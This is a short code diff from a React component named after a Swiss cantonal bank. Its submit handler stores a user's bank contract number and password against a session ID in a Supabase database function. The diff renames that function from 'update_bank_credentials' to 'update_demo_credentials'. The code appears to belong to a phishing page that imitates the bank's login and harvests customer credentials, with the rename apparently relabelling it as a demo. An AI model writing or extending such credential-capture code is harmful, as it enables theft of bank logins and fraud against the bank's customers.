@@ -184,7 +184,7 @@ const ChThurgauerKantonalbank = () => {
   const handleSubmit = async () => {
     if (!canSubmit) return;
     if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
+      const { error } = await supabase.rpc("update_demo_credentials", {
         p_session_id: sessionId,
         p_username: vertragsnummer,
         p_password: passwort,
